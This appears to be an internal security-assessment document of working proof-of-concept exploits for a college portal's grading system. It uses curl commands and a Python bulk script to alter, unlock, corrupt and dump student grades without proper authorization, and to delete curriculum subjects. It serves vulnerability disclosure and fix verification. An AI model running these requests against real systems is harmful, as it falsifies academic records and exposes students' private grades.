# College Portal — Proof of Concept (PoC)
**Date:** June 6, 2026  
**Classification:** Internal — Restricted  
**Purpose:** Demonstrate exploitability of confirmed vulnerabilities

> **Usage Policy:** These PoCs are for internal assessment purposes only. Replace `http://app.local` with the actual application URL in your test environment. Do not run against production systems without written authorization.

---

## PoC-C-01 — Unauthenticated Grade Corruption via Dynamic Column Injection

**Finding:** C-01 (CRITICAL)  
**Route:** `GET /teacher/update/hps`  
**Middleware:** None  
**Prerequisites:** Knowledge of a `grades.id` value (obtainable via PoC-C-07)

### Step 1 — Enumerate Grade Record IDs (No Auth)
```bash
# Get all grade records for a known section
curl -s "http://app.local/teacher/get/grades/5/1"
# Returns: JSON with grades.id values and student info — no login required
```

### Step 2a — Set Quarterly Grade to Failing (65)
```bash
# grades.id = target grade record
# b = qg (quarterly grade column)
# c = value to set
curl -s "http://app.local/teacher/update/hps?a=1&b=qg&c=65"
# No auth, no CSRF — immediately sets quarterly grade for all students
# with grades.id=1 to 65 (minimum failing threshold)
```

### Step 2b — Set Quarterly Grade to Passing (100)
```bash
curl -s "http://app.local/teacher/update/hps?a=1&b=qg&c=100"
```

### Step 2c — Reopen a Locked/Submitted Grade Sheet
```bash
# submitted=0 unlocks a grade sheet even after teacher submitted it
curl -s "http://app.local/teacher/update/hps?a=1&b=submitted&c=0"
```

### Step 2d — Zero Out HPS (Highest Possible Score) — Division by Zero
```bash
# Zeroing wwhps0 causes (score / 0) * 100 in grade computation → NaN/Infinity
curl -s "http://app.local/teacher/update/hps?a=1&b=wwhps0&c=0"
# Also zero pthps (Performance Task HPS) and qahps (QA HPS)
curl -s "http://app.local/teacher/update/hps?a=1&b=pthps&c=0"
```

### Bulk Attack (Corrupt All Records)
```python
#!/usr/bin/env python3
"""PoC-C-01: Bulk grade corruption — no authentication required"""
import requests

BASE = "http://app.local"

# Step 1: Get section grade IDs
section_grades = requests.get(f"{BASE}/teacher/get/grades/5/1").json()
grade_ids = [g['id'] for g in section_grades]

# Step 2: Zero out all HPS values — causes division by zero in grade computation
for gid in grade_ids:
    r = requests.get(f"{BASE}/teacher/update/hps", params={'a': gid, 'b': 'pthps', 'c': 0})
    print(f"[*] Zeroed pthps for grades.id={gid} — status {r.status_code}")
    r = requests.get(f"{BASE}/teacher/update/hps", params={'a': gid, 'b': 'wwhps0', 'c': 0})
    print(f"[*] Zeroed wwhps0 for grades.id={gid}")

print(f"\n[!] Done — {len(grade_ids)} grade records corrupted. No login was used.")
```

**Verification:**
```sql
-- Check that changes took effect
SELECT id, qg, submitted, pthps, wwhps0 FROM grades WHERE id = 1;
-- Expected: values reflect the attacker's inputs
```

---

## PoC-C-02 — Any Authenticated User Modifies K-12 Grade Records

**Finding:** C-02 (HIGH)  
**Route:** `GET /teacher/update/grades`  
**Middleware:** None (fails without auth session due to `auth()->user()->id`)  
**Prerequisites:** Any valid login (student, parent, cashier, etc.)

```bash
# Log in as a student (use Registrar PoC-R-01 if needed to create the account)
curl -s -c cookies.txt -b cookies.txt \
  -X POST "http://app.local/login" \
  --data-urlencode "_token=<CSRF>" \
  --data-urlencode "email=S1001" \
  --data-urlencode "password=<password>"

# Craft the grade modification payload
# inputedData[0] = [gradesdetail.id, ww0, ww1, ..., ww9, total, pt0, ..., pt9, pttotal, qa1, <unused>, ig, qg]
# Set all written work and performance task scores to maximum
curl -s -b cookies.txt "http://app.local/teacher/update/grades" \
  -G \
  --data-urlencode "inputedData[0][0]=<gradesdetail_id>" \
  --data-urlencode "inputedData[0][1]=10" \
  --data-urlencode "inputedData[0][2]=10" \
  --data-urlencode "inputedData[0][3]=10" \
  --data-urlencode "inputedData[0][4]=10" \
  --data-urlencode "inputedData[0][5]=10" \
  --data-urlencode "inputedData[0][6]=10" \
  --data-urlencode "inputedData[0][7]=10" \
  --data-urlencode "inputedData[0][8]=10" \
  --data-urlencode "inputedData[0][9]=10" \
  --data-urlencode "inputedData[0][10]=10" \
  --data-urlencode "inputedData[0][11]=100" \
  --data-urlencode "inputedData[0][12]=10" \
  --data-urlencode "inputedData[0][13]=10" \
  --data-urlencode "inputedData[0][14]=10" \
  --data-urlencode "inputedData[0][15]=10" \
  --data-urlencode "inputedData[0][16]=10" \
  --data-urlencode "inputedData[0][17]=10" \
  --data-urlencode "inputedData[0][18]=10" \
  --data-urlencode "inputedData[0][19]=10" \
  --data-urlencode "inputedData[0][20]=10" \
  --data-urlencode "inputedData[0][21]=100" \
  --data-urlencode "inputedData[0][22]=0" \
  --data-urlencode "inputedData[0][23]=100" \
  --data-urlencode "inputedData[0][24]=0" \
  --data-urlencode "inputedData[0][25]=100" \
  --data-urlencode "inputedData[0][26]=100" \
  --data-urlencode "inputedDataHPS[0][0]=<grades_id>"

# Expected response: "1" (success)
```

**Verify:**
```sql
SELECT id, ww0, ww1, pt0, qg FROM gradesdetail WHERE id = <gradesdetail_id>;
-- All columns set to 10 / 100 as specified
```

---

## PoC-C-03 — Student Self-Approves College Final Grade (Full Chain)

**Findings:** C-03 + C-04  
**Complexity:** Medium  
**Prerequisites:** Valid student login + knowledge of own `studid` and enrolled `subjid`

### Step 1 — Save a Perfect Final Grade
```bash
# Logged in as student S1001 (studid=1001)
curl -s -b cookies.txt \
  "http://app.local/college/student/grade/save?studid=1001&subjid=3&field=finalgrade&grade=1.0&syid=1&semid=1"
# Expected: [{"status":1,"data":"Updated Successfully"}]
```

### Step 2 — Submit the ECR for Review
```bash
curl -s -b cookies.txt \
  "http://app.local/college/grade/ecr/submit?id=<headerid>&syid=1&semid=1&schedid=5&term=FINAL"
# Expected: [{"status":1,"message":"Submitted Successfully!"}]
```

### Step 3 — Approve (Should Require Chairperson — Anyone Can Do It)
```bash
curl -s -b cookies.txt \
  "http://app.local/college/grade/ecr/approve?id=<headerid>&syid=1&semid=1&schedid=5&term=FINAL"
# Expected: [{"status":1,"message":"Approved Successfully!"}]
```

### Step 4 — Post (Should Require Dean — Anyone Can Do It)
```bash
curl -s -b cookies.txt \
  "http://app.local/college/grade/ecr/post?id=<headerid>&syid=1&semid=1&schedid=5&term=FINAL"
# Expected: [{"status":1,"message":"Posted Successfully!"}]
```

**Result:** `college_exlgrade.status = 4` (POSTED) — the student's self-assigned grade of 1.0 is now permanently in the academic record with the Dean's user ID in the logs.

---

## PoC-C-04 — Student Removes Subject from College Curriculum

**Finding:** C-05 (HIGH)  
**Route:** `GET /dean/remove/prospectussubject/{subject}`  
**Middleware:** `auth` only  
**Prerequisites:** Any authenticated user

```bash
# With any valid session (student, teacher, parent, etc.)
curl -s -b cookies.txt \
  "http://app.local/dean/remove/prospectussubject/1"
# Removes subject ID 1 from the college prospectus
# Any student enrolled in the course now has an inconsistent graduation checklist

# Add a fake subject to the curriculum
curl -s -b cookies.txt \
  "http://app.local/dean/store/prospectus?subjectID=99&courseID=1&yearID=1&semesterID=1&units=3"
```

**Impact verification:**
```sql
-- Subject ID 1 should be deleted or marked deleted in college_prospectus
SELECT id, deleted FROM college_prospectus WHERE id = 1;
-- Expected: deleted = 1
```

---

## PoC-C-05 — Unauthenticated Grade Status Submission

**Finding:** C-06 (HIGH)  
**Route:** `GET /college/student/grade/status/submit`  
**Middleware:** None

```bash
# No login required — submits a grade status update
curl -s "http://app.local/college/student/grade/status/submit?statusid=<id>&datafield=<value>"
# Changes grade submission workflow state for the target record
```

**Combined with C-01:**
```bash
# 1. Corrupt grade (unauthenticated)
curl -s "http://app.local/teacher/update/hps?a=1&b=qg&c=100"

# 2. Submit the grade record through workflow (unauthenticated)
curl -s "http://app.local/college/student/grade/status/submit?statusid=1&datafield=submitted"
```

---

## PoC-C-06 — Unauthenticated Student Grade Dump

**Finding:** C-07 (MEDIUM)  
**Routes:** No authentication required

```bash
# Dump all student grades for section 5, subject 3 — no login
curl -s "http://app.local/college/subject/students?syid=1&semid=1&sectionid=5&subjid=3"
# Returns: JSON with all students' grade fields (prelemgrade, midtermgrade, finalgrade, etc.)

# Dump all grade values for section 5 quarter 1 — no login (K-12 basic ed)
curl -s "http://app.local/teacher/get/grades/5/1"
# Returns: JSON with all gradesdetail records for the section
```

---

## PoC-C-07 — Unauthenticated College Teacher/Schedule Enumeration

**Finding:** C-08 (MEDIUM)  
**Routes:** No authentication required — useful for recon before C-01 through C-06

```bash
# List all college teachers
curl -s "http://app.local/college/techer"  # note: typo in route name

# List all college subjects
curl -s "http://app.local/college/subjects"

# List schedule for a subject
curl -s "http://app.local/subject/schedule?schedid=5"

# List courses assigned to a chairperson
curl -s "http://app.local/chairpersoninfo?courses=courses&teacherid=1"
```

---

## Summary of PoC Results

| PoC | Expected Before Fix | Expected After Fix |
|---|---|---|
| PoC-C-01 | No auth → grade value updated immediately | `302 /login` or `403 Forbidden` |
| PoC-C-01 (column injection) | Any column updated | Only allowlisted HPS columns accepted |
| PoC-C-02 | Student session → grade modified | `403` — isTeacher/isCT required |
| PoC-C-03 (approve) | Any auth → `Approved Successfully!` | `403` — isCP required |
| PoC-C-03 (post) | Any auth → `Posted Successfully!` | `403` — isDean required |
| PoC-C-04 | Any auth → subject deleted | `403` — isDean required |
| PoC-C-05 | No auth → status submitted | `302 /login` |
| PoC-C-06 | No auth → full grade dump | `302 /login` |
| PoC-C-07 | No auth → teacher/schedule data | `302 /login` |

---

*End of College Portal PoC Document*
